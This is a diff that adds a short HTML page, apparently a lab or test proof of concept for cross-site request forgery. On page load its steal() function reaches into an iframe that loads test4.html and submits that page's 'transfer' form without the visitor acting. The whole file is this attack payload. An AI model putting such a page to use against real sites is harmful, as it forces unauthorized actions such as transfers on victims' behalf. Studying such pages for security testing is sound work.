@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+　　<head>
+  　　　　<script type="text/javascript">
+  function steal()
+  {
+    var win = document.getElementById("steal").contentWindow;
+    debugger;
+    win.document.getElementById('transfer').submit();
+  }
+
+</script>
+  　　</head>
+　　<body onload="steal()">
+　　　　<iframe id="steal"  name="steal" display="none" src="test4.html">
+  　　　　　　
+  　　　</iframe>
+
+
+
+　　</body>
+</html>
